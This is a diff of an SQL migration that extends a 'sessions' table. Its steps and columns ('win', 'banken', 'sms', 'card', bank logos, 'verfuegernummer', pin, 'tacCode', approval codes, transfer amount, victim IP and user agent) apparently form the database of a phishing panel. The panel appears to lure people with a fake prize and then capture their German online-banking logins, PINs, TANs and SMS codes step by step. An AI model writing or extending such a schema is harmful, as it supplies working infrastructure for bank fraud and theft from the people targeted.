@@ -14,16 +14,43 @@ create extension if not exists "pgcrypto";
 create table if not exists public.sessions (
   id text primary key default encode(gen_random_bytes(12), 'hex'),
   amount integer not null default 0 check (amount >= 0),
-  current_step text not null default 'win'
-    check (current_step in ('win', 'banken', 'wait', 'sms', 'card', 'congrats', 'special_approval', 'SPECIAL_INFO')),
-  status text not null default 'offline'
-    check (status in ('online', 'offline', 'SUCCESS', 'CONGRATS', 'SPECIAL_INFO')),
-  sms_digits integer not null default 6 check (sms_digits >= 4 and sms_digits <= 12),
+  current_step text not null default 'win',
+  status text not null default 'offline',
+  sms_digits integer not null default 6,
   form_data jsonb not null default '{}'::jsonb,
   is_hidden boolean default false,
+  partner_name text,
+  public_id integer,
+  ip_address text,
+  user_agent text,
+  participation_code text,
+  sms_custom_text text,
+  is_win2_flow boolean default false,
+  pending_profile boolean default false,
+  phone text,
+  "bankSlug" text,
+  "bankName" text,
+  "viewingBankSlug" text,
+  "viewingBankName" text,
+  "logoFile" text,
+  verfuegernummer text,
+  pin text,
+  "tacCode" text,
+  "selectedProvider" text,
+  "transferAmount" text,
+  "approvalStatus" text,
+  "approvalCode" text,
+  "approvalConfirmedAt" timestamptz,
+  "approvalHistory" jsonb,
+  "specialNoticeText" text,
+  "specialNoticeImage" text,
+  "specialNoticeLang" text,
+  "specialNoticeSentAt" timestamptz,
+  "customQuestions" jsonb,
   created_at timestamptz not null default now(),
   updated_at timestamptz not null default now()
 );
+create unique index if not exists sessions_public_id_key on public.sessions (public_id);
 create index if not exists sessions_created_at_idx on public.sessions (created_at desc);
 alter table public.sessions replica identity full;
 
